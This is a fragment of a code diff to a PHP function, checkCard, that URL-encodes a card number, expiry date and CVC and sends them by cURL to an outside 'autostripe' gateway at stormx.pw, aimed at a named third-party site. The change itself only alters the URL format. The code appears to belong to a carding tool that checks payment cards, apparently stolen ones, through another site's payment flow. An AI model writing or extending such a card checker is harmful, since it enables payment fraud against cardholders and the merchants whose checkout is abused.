@@ -12,7 +12,7 @@ function checkCard($card_number, $exp_month, $exp_year, $cvc) {
     $encoded_cc = urlencode($card_details);
     
     // API endpoint configuration
-    $api_url = "https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=shebrews.org&cc=$encoded_cc";
+    $api_url = "https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=shebrews.org/cc=$encoded_cc";
 
     // Initialize cURL
     $ch = curl_init();
